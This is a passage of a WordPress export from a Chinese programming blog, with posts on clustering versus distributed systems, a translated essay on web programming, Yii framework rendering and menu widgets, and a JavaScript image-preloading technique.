		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=64</guid>
		<description></description>
		<content:encoded><![CDATA[之前一直对集群与分布式的概念不是很清楚，认为两个名词概念都差不多，那到底区别在哪呢，我也在网上找了很多解释，但似乎都没有言简意赅的讲清区别，或者说没有很形象的讲明每个名词是什么意思，到底有何用。那么我就依我的看法来讲一下，首先是分别讲解，再来合起来讲一下：
【集群】
处理同一个业务，目的是实现高可用性，可用性顾名思义，就是要让用户能用，并且随时能访问。一个集群针对一个业务并且有着多台服务器，当一个服务器挂掉，剩下的几台能顶替着继续工作（当然这几台服务器在那台服务器没挂的时候也不是闲着的，他们都是在同时处理大量请求的业务，那台服务器挂掉后，它的一些任务只好让这几台来顺带帮着完成了），这样用户能继续访问网站的某一业务。举个例子，比如我有发布日志的业务，如果我只有一台服务器支撑着这个业务，当服务器因某种原因挂掉后，那么用户也就无法发日志，这一业务也就无法使用。然而如果我有着服务器集群，其中一台挂掉，用户仍然能发日志。
【分布式】
将不同的业务放在不同的地方（节点），换句话说，每个分布式节点都处理不同的任务（一个节点处理一个业务），举个例子，有一个节点的业务是处理上传图片，还有一个节点的业务是处理发布文章，就这样把每个业务放在不同的地方（节点）。
【分布式与集群的关系】
每一个分布式节点都可以看做一个集群，上面说了，分布式的每一个节点都处理一种业务，而集群是处理同一业务，那么分布式的节点可以做一个集群。
<hr />
&nbsp;
当然，从不同角度看，可能理解也有偏差。主要还是集群的概念比较重要。我个人认为集群除了实现高可用性，还有高并发和高性能。这可能要涉及负载均衡了，比如访问一个网站的一个业务，对应的有一个集群，前面放着相应服务器，后面几台服务器负责处理这个业务，当有业务访问的时候，相应服务器会根据哪台服务器负载情况，将业务交给负载不是很重的服务器去完成
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>64</wp:post_id>
		<wp:post_date><![CDATA[2014-04-27 13:50:11]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-04-27 13:50:11]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e6%a6%82%e5%bf%b5%e8%a7%a3%e9%87%8a-%e9%9b%86%e7%be%a4%e4%b8%8e%e5%88%86%e5%b8%83%e5%bc%8f%e7%9a%84%e5%8c%ba%e5%88%ab]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="%e5%88%86%e5%b8%83%e5%bc%8f"><![CDATA[分布式]]></category>
		<category domain="category" nicename="jiagou"><![CDATA[架构]]></category>
		<category domain="post_tag" nicename="%e8%b4%9f%e8%bd%bd"><![CDATA[负载]]></category>
		<category domain="post_tag" nicename="%e9%9b%86%e7%be%a4"><![CDATA[集群]]></category>
						<wp:comment>
			<wp:comment_id>2</wp:comment_id>
			<wp:comment_author><![CDATA[wApXoMyr]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[]]></wp:comment_author_email>
			<wp:comment_author_url>http://www.6uruqc9IG1oZ7qt10gU479.com/</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[49.128.54.28]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-04-29 01:30:05]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-04-29 01:30:05]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[<strong>wApXoMyr</strong>
概念解释：集群与分布式的区别 | Veitor]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[trackback]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>所有编程皆为Web编程</title>
		<link>http://wp.veitor.net/2014/04/28/%e6%89%80%e6%9c%89%e7%bc%96%e7%a8%8b%e7%9a%86%e4%b8%baweb%e7%bc%96%e7%a8%8b/</link>
		<pubDate>Mon, 28 Apr 2014 00:49:48 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=71</guid>
		<description></description>
		<content:encoded><![CDATA[<span style="color: #993366;"><strong>大部分人想去做Web编程的原因是，他们不够聪明，因此也做不了别的事。</strong>他们不懂编译器、并发性、3D或类继承。他们根本不明白我为什么要使用接口或者抽象类。他们不理解虚函数、指针、引用、垃圾回收、终结器、传引用与传值的区别、C++的虚拟析构函数、或者C#的结构体与类之间的差别。他们对进程也一无所知。更别提瀑布、螺旋、敏捷了！他们从来没看过需求文档，也从来没写过设计文档；他们从没画过一张UML图，甚至听都没听说过有“顺序图”这种东西。</span>
<span style="color: #993366;">　　不过，他们确实有些手段：他们知道怎样匆匆拼凑一个ASP.NET网页，向数据库发一些（写得很糟糕的）SQL指令，填上一个数据集，然后用网格控件展示出来。他们也就会这些了吧。而且，他们在弄明白这些东西的时候，很可能也没费多长时间。</span>
<span style="color: #993366;">　　因此，请恕我冒犯——我才不想当Web程序员呢！我有两个理由。第一，那对我太没有挑战性了。第二，因为绝大多数互联网公司的工程师都很糟糕，更准确地说，因为你不必去琢磨深奥的东西就能成为一个Web开发者。在我看来，互联网正让我们变得越来越弱智。拼凑出一个网页真的不需要你有那么聪明。</span>
<span style="color: #993366;">　　我真心希望大家都错了，希望不必所有的东西都“转向Web”。因为如果真这样的话，将来的某一天，我要么会不情愿地接受这种无聊的转变，要么只能换一个职业了。</span>
Web开发没有挑战性，所以吸引了不够格的软件开发者？让我们姑且不讨论这种荒谬的观点。即使过去真是这样，如今的情况也已经不同了。
我其实不想在Michael面前扮演“坏人”，告诉他这个坏消息：对于越来越多的用户来说，桌面应用软件已经完蛋了。几年来，大部分桌面应用软件都被Web应用代替了。随着网络浏览器进化得越来越强大和健壮，每天都有更多的桌面应用被取代。
你希望不必所有的东西都“转向Web”？醒醒吧！这已经发生了！
任何学习计算机历史的学生都可以告诉你，Web应用成为主流正是“最不强大原则”（<a href="http://blog.codinghorror.com/the-principle-of-least-power/" target="_blank" rel="noopener noreferrer">The Principle of Least Power</a>）所预示的：
<span style="color: #993366;">　计算机科学界过去花了40年的时间，致力于让语言尽可能地强大。时至今日，我们必须感激那些让我们选择不是最强大的解决方案（而选择最不强大的方案）的原因。计算机语言越不强大，你对用那种语言存储的数据能做的事情就越多。如果你以一种简单的陈述形式来书写，任何人都可以写一个程序去分析它。比方说，一个呈现天气信息的网页使用RDF（译者注：资源描述框架，一种用于描述Web资源的标记语言）来描述数据，用户可以把它装进一个表格，也许再做一下平均计算，绘制图表，然后结合其他信息做出某种推断。另一种极端的做法是，天气信息通过巧妙的Java小程序描绘出来。尽管这种方式可能做出很酷的用户界面，但它完全不能被分析。找到这个页面的搜索引擎将无法判断那是什么数据或者那些数据有什么用。要想知道一个Java小程序是做什么的，唯一的办法是亲眼目睹它运行起来。</span>
互联网恰恰是做最简单（或者说最傻）而靠谱之事的具体表现。如果这吓到了你（让你感到不安了），那么我要小声地告诉你，你没有理由成为一名程序员。
所有应用都应该成为Web应用吗？当然不是。总有一些重要的例外，有些种类的软件跟网络也毫无关系。但是，这些是少数情况，是一些特殊应用。它们固然是重要的小生态环境，但不管怎么说，就只是“小生态”。
如果你希望尽可能多的用户来使用你的软件，绝没有比把它做成Web应用更好的方法了。对于现存软件来说，互联网是最高效、最普遍、最直接的分发网络。任何用户只要能连上网，有一个浏览器，不管他身处世界的任何一个角落，只须点两下鼠标就能与你写的软件开始交互了。哪怕是最蹩脚的Web应用，它的受众面和传播度都是令人震惊的；而且还在每天扩大着……我也曾因此杜撰了“<a href="http://baike.baidu.com/view/10384969.htm" target="_blank" rel="noopener noreferrer">阿特伍德定律</a>”：<strong>任何可以用JavaScript来写的应用，最终都将用JavaScript来写。</strong>
从工程的角度来看，用JavaScript来写Photoshop、Word或Excel毫无意义。但是，这是不可避免的。这事会发生的。实际上，这事已经在发生了。环顾一下你的四周吧。
作为一名软件开发者，最让我开心的是编写有人使用的软件。如果你的软件委身于一个二进制的EXE文件，它必须被购买、授权、运送、下载、安装、维护和升级，你的技艺又有什么意义呢？考虑到程序员与用户之间的所有这些传统障碍，软件行业居然还能生存下来，这真是一个奇迹！然而，在华丽而崭新的Web应用世界里，那些制约已经不复存在。边界没有了。软件可以无处不在！
Web编程还远远没有达到完美的境地。其实，还有点乱！没错，随便会写点代码的人就能三下两下地搞出一个糟糕的Web应用；也确实，99%的Web应用都似狗屎一堆。但是，这也意味着，相当“聪明”的程序员们正在将他们的成果展现在成百上千（或者成千上万，甚至几百万）的用户面前，而这在互联网盛行之前是绝无可能的。在我看来，让代码遭受冷落、让它们就此孤独终老，没什么比这更让人感到悲哀的了！把软件按照Web应用的形式重整一下，即使软件本身并不怎么样，这也使得程序员们能够把他们的软件展现在某个地方的某人面前。
如果受众面和技艺方面的观点不足以说服你，那就从商业的角度来考虑一下吧。<a href="http://www.skrenta.com/2007/07/fletchers_angry_list_of_startu.html" target="_blank" rel="noopener noreferrer">Mark Fletcher曾经给出过一份创业规则</a>，其中就有这么一条：
<span style="color: #993366;">　你在做一个Web应用，对吧？这不是20世纪80年代了！纵然你的竞争对手把（桌面）应用软件做得别致优雅，你那简陋而寒酸的Web应用也仍然会比它更加成功。</span>
要不了多久，所有编程都将是Web编程。对于普通的在职程序员来说，如果你不认为这是一个值得庆贺的理由，你也许应该转行了。
原文地址：http://blog.codinghorror.com/all-programming-is-web-programming/]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>71</wp:post_id>
		<wp:post_date><![CDATA[2014-04-28 00:49:48]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-04-28 00:49:48]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e6%89%80%e6%9c%89%e7%bc%96%e7%a8%8b%e7%9a%86%e4%b8%baweb%e7%bc%96%e7%a8%8b]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
						</item>
					<item>
		<title>Yii：render渲染视图分析</title>
		<link>http://wp.veitor.net/2014/04/28/yii-render%e6%b8%b2%e6%9f%93%e8%a7%86%e5%9b%be%e5%88%86%e6%9e%90/</link>
		<pubDate>Mon, 28 Apr 2014 03:12:42 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=74</guid>
		<description></description>
		<content:encoded><![CDATA[一起了解一下render方法的工作原理，先看render代码：
<pre class="lang:php decode:true">public function render($view,$data=null,$return=false)
	{
		if($this-&gt;beforeRender($view))
		{
			$output=$this-&gt;renderPartial($view,$data,true);
			if(($layoutFile=$this-&gt;getLayoutFile($this-&gt;layout))!==false)
				$output=$this-&gt;renderFile($layoutFile,array('content'=&gt;$output),true);
			$this-&gt;afterRender($view,$output);
			$output=$this-&gt;processOutput($output);
			if($return)
				return $output;
			else
				echo $output;
		}
	}</pre>
首先是beforeRender：
<pre class="lang:php decode:true">protected function beforeRender($view)
{
	return true;
}</pre>
这个封装方法是用在render方法开头，参数是模板文件名称（不带后缀），是用来在渲染视图之前做的一些预处理，我们可以在控制器里重写这个方法来处理，但结果返回的值必须等于true，以便输出视图。
接着执行renderPartial方法：
<pre class="lang:php decode:true">public function renderPartial($view,$data=null,$return=false,$processOutput=false)
	{
		if(($viewFile=$this-&gt;getViewFile($view))!==false)
		{
			$output=$this-&gt;renderFile($viewFile,$data,true);
			if($processOutput)
				$output=$this-&gt;processOutput($output);
			if($return)
				return $output;
			else
				echo $output;
		}
		else
			throw new CException(Yii::t('yii','{controller} cannot find the requested view "{view}".',
				array('{controller}'=&gt;get_class($this), '{view}'=&gt;$view)));
	}</pre>
这个方法是$view为模板文件名（不带后缀，后缀通过配置指定），$data是一个关联数组，它将被extract函数提取成供模板中使用的PHP变量。这个方法与render区别在于，该方法渲染视图时，不会渲染布局也不会加载Yii内置的js\css，而render会一起渲染布局文件和脚本。
<span style="color: #666699;">其中的getViewFile方法是根据模板名寻找木板文件的方法，如果在main配置文件中指定了主题，那么确定的一个模板将被找到。否则的话将按一下规则寻找：</span>
<span style="color: #666699;">模块内的视图：直接指定模板文件路径，以单个斜线“\”开始的路径。</span>
<span style="color: #666699;">应用内的视图：直接指定模板文件路径，以双斜线“\\”开始的路径。</span>
<span style="color: #666699;">别名路径：以点分割的路径。别名路径alias以后会讲，其实在初始化应用的时候定义了一些路径别名。</span>
这里只需了解getViewFile是寻找模板地址和extract变量即可，接着讲renderPartial，找到模板后继续执行。接着要执行到判断第四个参数processOutput，该函数主要是用于是否加载Yii内置js\css，即上面刚才说的render和renderPartial区别之一，在render中该参数为true即加载，在renderPartial中反之。
然后接着执行到getLayoutFile，刚才是获取了不带布局视图，相当于只执行了renderPartial方法，这里再获取布局文件。getLayoutFile是查找布局模板文件，查找方法和上面的查找模板文件类似。通过在控制器中设置layout变量，加载应用内的布局文件的话设置路径只要以双斜线“\\”开头即可，加载模块内的布局路径以单个斜线“\”开头，另外还有别名路径同样可以设置。
找到布局文件之后，依然使用renderFile方法渲染布局文件，将之前渲染的试图文件插入到布局文件中。
接着执行afterRender方法，也不需要太多解释了，当然是执行渲染之后的一些工作，可以自己定义。
再执行processOutput，因为render是默认加载js\css的，所以这里不需要判断了。
最后再根据render第三个参数判断是否要直接输出，如果为false的话，就是直接看到的页面了，为true只将html代码返回。
&nbsp;
&nbsp;
render的方法基本就是这样了，主要还是在renderPartial里处理过程比较多。如果有疑问，可以在下面留言给我，一起探讨。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>74</wp:post_id>
		<wp:post_date><![CDATA[2014-04-28 03:12:42]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-04-28 03:12:42]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[yii-render%e6%b8%b2%e6%9f%93%e8%a7%86%e5%9b%be%e5%88%86%e6%9e%90]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="yii"><![CDATA[Yii]]></category>
		<category domain="post_tag" nicename="%e6%a8%a1%e6%9d%bf"><![CDATA[模板]]></category>
						<wp:comment>
			<wp:comment_id>3</wp:comment_id>
			<wp:comment_author><![CDATA[吴叔叔]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[]]></wp:comment_author_email>
			<wp:comment_author_url>http://t.qq.com/wushushu1025</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[222.46.26.23]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2014-08-26 01:41:45]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2014-08-26 01:41:45]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[接着要执行到判断第四个参数processOutput，该函数主要是用于是否加载Yii内置jscssYii内置jscss是写在什么地方的]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>4</wp:comment_id>
			<wp:comment_author><![CDATA[Veitor]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[dandankele@vip.qq.com]]></wp:comment_author_email>
			<wp:comment_author_url>http://www.veitor.net</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[61.160.251.57]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2014-08-27 06:18:56]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2014-08-27 06:18:56]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[还是同在CController.php文件里，看processOutput()函数，封装了很多，Yii::app()-&gt;getClientScript()获得script组件的，比较繁琐，需要慢慢理解]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[comment]]></wp:comment_type>
			<wp:comment_parent>3</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					<wp:comment>
			<wp:comment_id>5</wp:comment_id>
			<wp:comment_author><![CDATA[thx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[abc@abc.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[120.135.23.152]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-10-15 14:30:56]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-10-15 14:30:56]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[yii2中，视图文件中使用的$this，是由于渲染视图把视图文件渲染成view实例了？]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[duoshuo]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>Yii：zii.widgets.CMenu使用方法</title>
		<link>http://wp.veitor.net/2014/04/28/yii-zii-widgets-cmenu%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95/</link>
		<pubDate>Mon, 28 Apr 2014 07:21:43 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=76</guid>
		<description></description>
		<content:encoded><![CDATA[Yii框架中的一个生成菜单的小物件。
先上个示例代码：
<pre class="lang:php decode:true">&lt;?php
$this-&gt;widget('zii.widgets.CMenu',array(
    'activeCssClass'=&gt;'当前热点元素的样式',
    'firstItemCssClass'=&gt;'第一个元素的样式',
    'lastItemCssClass'=&gt;'最后一个元素的样式',
    'encodeLable'=&gt;'false',  //当值为false时，label标签中的html就会将样式显示出来.
    'htmlOptions'=&gt;array('class'=&gt;'默认样式'),
    'items'=&gt;array(
        array('label'=&gt;'网站概况', 'url'=&gt;array('/admin'),'itemOptions'=&gt;array('class'=&gt;'li_status'),'active'=&gt;$this-&gt;id=='admin'?true:false),
        array('label'=&gt;'图片管理', 'url'=&gt;array('/picture'),'template'=&gt;'{menu}&lt;span&gt;this is additional infomation&lt;/span&gt;','itemOptions'=&gt;array('class'=&gt;'li_picture'),'active'=&gt;$this-&gt;id=='picture'?true:false, 'visible'=&gt;true),
        array('label'=&gt;'管理员管理', 'url'=&gt;array('/manager'),'itemOptions'=&gt;array('class'=&gt;'li_manager'),'submenuOptions'=&gt;array('class'=&gt;'subclass'),'active'=&gt;($this-&gt;id=='manager' &amp;&amp; $this-&gt;action-&gt;id!='changepswd')?true:false, 'visible'=&gt;false),
        array('label'=&gt;'密码修改', 'url'=&gt;array('/manager/changepswd'),'linkOptions'=&gt;array('target'=&gt;'_blank'),'itemOptions'=&gt;array('class'=&gt;'li_changepswd'),'items'=&gt;array(array('label'=&gt;'子栏目'))),'active'=&gt;($this-&gt;id=='manager' &amp;&amp; $this-&gt;action-&gt;id=='changepswd')?true:false, 'visible'=&gt;true),
        array('label'=&gt;'登陆', 'url'=&gt;array('/site/login'),'itemOptions'=&gt;array('class'=&gt;'li_login'), 'visible'=&gt;Yii::app()-&gt;user-&gt;isGuest),
        array('label'=&gt;'退出 ('.Yii::app()-&gt;user-&gt;name.')', 'url'=&gt;array('/site/logout'),'itemOptions'=&gt;array('class'=&gt;'li_login'), 'visible'=&gt;!Yii::app()-&gt;user-&gt;isGuest)
    ),
));
?&gt;</pre>
在模板中使用上面的代码，最终会生成以&lt;ul&gt;&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;构成的菜单列表，针对item中的每一个数组，可以进行以下设置：
<strong>label:</strong>菜单显示的文本，可以加html进行修饰，但要将encodeLabel参数值设为false
<strong>url:</strong>链接地址，若是字符串，则是基于网站根地址的绝对路径，比如网站地址为veitor.net，字符串url设置为"article"，则最终生成的地址为veitor.net/article，如果设置类型为数组，则效果与createUrl方法一样，比如网址还是veitor.net，设置的数组url为"array(detail/article)"，则最终生成的地址为veitor.net/?r=detail/article，控制器/方法格式的
<strong>visible:</strong>可见，boolean值，当然可以用函数来取值，决定什么情况下隐藏
<strong>active:</strong>正在访问，boolean值，如果是true，会在相应li中加入active样式，上面代码用到$this-&gt;id是个很好用的方法
<strong>items:</strong>定义子目录，array，通过样式可定义收缩排列或者鼠标经过时显示子目录
<strong>template:</strong>模板，模板中用{menu}来代表替换内容，见上代码
<strong>linkOptions:</strong>&lt;a&gt;的属性，可定义class,rel,target等属性，见上代码
<strong>itemOptions:</strong>&lt;li&gt;的属性，可定义class等属性，见上代码
<strong>submenuOptions:</strong>子栏目的&lt;ul&gt;属性，&lt;li&gt;和&lt;a&gt;属性还是和上面一样分别对item设置
<strong>activeCssClass：</strong>当前选中菜单的css的Class名称
<strong>firstItemCssClass：</strong>第一个菜单按钮的Css的Class名称
<strong>lastItemCssClass：</strong>最后一个菜单按钮的Css的Class名称
当然可以分别为每个Item菜单元素添加指定的Class，即在对应的Item元素上增加itemOptions设置（看上面代码）
&nbsp;
这些就是我用CMenu的一些见解，如果你有更好的方法可以一起交流。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>76</wp:post_id>
		<wp:post_date><![CDATA[2014-04-28 07:21:43]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-04-28 07:21:43]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[yii-zii-widgets-cmenu%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="yii"><![CDATA[Yii]]></category>
		<category domain="post_tag" nicename="%e8%8f%9c%e5%8d%95"><![CDATA[菜单]]></category>
						</item>
					<item>
		<title>再谈javascript图片预加载技术</title>
		<link>http://wp.veitor.net/2014/05/04/%e5%86%8d%e8%b0%88javascript%e5%9b%be%e7%89%87%e9%a2%84%e5%8a%a0%e8%bd%bd%e6%8a%80%e6%9c%af/</link>
		<pubDate>Sun, 04 May 2014 14:22:07 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=80</guid>
		<description></description>
		<content:encoded><![CDATA[lightbox类效果为了让图片居中显示而使用预加载，需要等待完全加载完毕才能显示，体验不佳（如filick相册的全屏效果）。javascript无法获取img文件头数据，真的是这样吗？本文通过一个巧妙的方法让javascript获取它。
这是大部分人使用预加载获取图片大小的例子：
<pre class="lang:js decode:true">var imgLoad = function (url, callback) {
	var img = new Image();
	img.src = url;
	if (img.complete) {
		callback(img.width, img.height);
	} else {
		img.onload = function () {
			callback(img.width, img.height);
			img.onload = null;
		};
	};
};</pre>
&nbsp;
可以看到上面必须等待图片加载完毕才能获取尺寸，其速度不敢恭维，我们需要改进。
web应用程序区别于桌面应用程序，响应速度才是最好的用户体验。如果想要速度与优雅兼得，那就必须提前获得图片尺寸，如何在图片没有加载完毕就能获取图片尺寸？
十多年的上网经验告诉我：浏览器在加载图片的时候你会看到图片会先占用一块地然后才慢慢加载完毕，并且不需要预设width与height属性，因为浏览器能够获取图片的头部数据。基于此，只需要使用javascript定时侦测图片的尺寸状态便可得知图片尺寸就绪的状态。
当然实际中会有一些兼容陷阱，如width与height检测各个浏览器的不一致，还有webkit new Image()建立的图片会受以处在加载进程中同url图片影响，经过反复测试后的最佳处理方式：
<pre class="lang:js decode:true">// 更新：
// 05.27: 1、保证回调执行顺序：error &gt; ready &gt; load；2、回调函数this指向img本身
// 04-02: 1、增加图片完全加载后的回调 2、提高性能
/**
 * 图片头数据加载就绪事件 - 更快获取图片尺寸
 * @version	2011.05.27
 * @author	TangBin
 * @see		http://www.planeart.cn/?p=1121
 * @param	{String}	图片路径
 * @param	{Function}	尺寸就绪
 * @param	{Function}	加载完毕 (可选)
 * @param	{Function}	加载错误 (可选)
 * @example imgReady('http://www.google.com.hk/intl/zh-CN/images/logo_cn.png', function () {
		alert('size ready: width=' + this.width + '; height=' + this.height);
	});
 */
var imgReady = (function () {
	var list = [], intervalId = null,
	// 用来执行队列
	tick = function () {
		var i = 0;
		for (; i &lt; list.length; i++) {
			list[i].end ? list.splice(i--, 1) : list[i]();
		};
		!list.length &amp;&amp; stop();
	},
	// 停止所有定时器队列
	stop = function () {
		clearInterval(intervalId);
		intervalId = null;
	};
	return function (url, ready, load, error) {
		var onready, width, height, newWidth, newHeight,
			img = new Image();
		img.src = url;
		// 如果图片被缓存，则直接返回缓存数据
		if (img.complete) {
			ready.call(img);
			load &amp;&amp; load.call(img);
			return;
		};
		width = img.width;
		height = img.height;
		// 加载错误后的事件
		img.onerror = function () {
			error &amp;&amp; error.call(img);
			onready.end = true;
			img = img.onload = img.onerror = null;
		};
		// 图片尺寸就绪
		onready = function () {
			newWidth = img.width;
			newHeight = img.height;
			if (newWidth !== width || newHeight !== height ||
				// 如果图片已经在其他地方加载可使用面积检测
				newWidth * newHeight &gt; 1024
			) {
				ready.call(img);
				onready.end = true;
			};
		};
		onready();
		// 完全加载完毕的事件
		img.onload = function () {
			// onload在定时器时间差范围内可能比onready快
			// 这里进行检查并保证onready优先执行
			!onready.end &amp;&amp; onready();
			load &amp;&amp; load.call(img);
			// IE gif动画会循环执行onload，置空onload即可
			img = img.onload = img.onerror = null;
		};
		// 加入队列中定期执行
		if (!onready.end) {
			list.push(onready);
			// 无论何时只允许出现一个定时器，减少浏览器性能损耗
			if (intervalId === null) intervalId = setInterval(tick, 40);
		};
	};
})();</pre>
调用例子：
<pre class="lang:js decode:true">imgReady('http://pic1.hualongxiang.com/attachment/photo/Mon_1405/343656_7b0313991240910abfa97883b96b9.jpg', function () {
	alert('size ready: width=' + this.width + '; height=' + this.height);
});</pre>
是不是很简单？这样的方式获取摄影级别照片尺寸的速度往往是onload方式的几十多倍，而对于web普通(800×600内)浏览级别的图片能达到秒杀效果。看了这个再回忆一下你见过的web相册，是否绝大部分都可以重构一下呢？好了，请观赏令人愉悦的 DEMO ：
http://www.planeart.cn/demo/imgReady/
（通过测试的浏览器：Chrome、Firefox、Safari、Opera、IE6、IE7、IE8）
&nbsp;
原文地址：http://www.planeart.cn/?p=1121]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>80</wp:post_id>
		<wp:post_date><![CDATA[2014-05-04 14:22:07]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-05-04 14:22:07]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%86%8d%e8%b0%88javascript%e5%9b%be%e7%89%87%e9%a2%84%e5%8a%a0%e8%bd%bd%e6%8a%80%e6%9c%af]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="js"><![CDATA[JS]]></category>
		<category domain="post_tag" nicename="%e9%a2%84%e5%8a%a0%e8%bd%bd"><![CDATA[预加载]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_ff1b5073ebbb689b1d9d68f0248be804]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>了解PHP中crypt加密函数</title>
		<link>http://wp.veitor.net/2014/05/10/%e4%ba%86%e8%a7%a3php%e4%b8%adcrypt%e5%8a%a0%e5%af%86%e5%87%bd%e6%95%b0/</link>
		<pubDate>Sat, 10 May 2014 08:33:05 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=86</guid>
		<description></description>
		<content:encoded><![CDATA[曾经在分析Yii框架的博客demo中看到使用了这个crypt函数，于是就大致的了解了一下。
crypt() 返回一个基于标准 UNIX DES 算法或系统上其他可用的替代算法的散列字符串，这是手册中写到的，可能有些同学不是很理解这句话，我的理解就是，crypt回返回不同类型的散列字符串，即使用了不同算法返回的。而具体使用哪个算法，还要看所以来的操作系统。
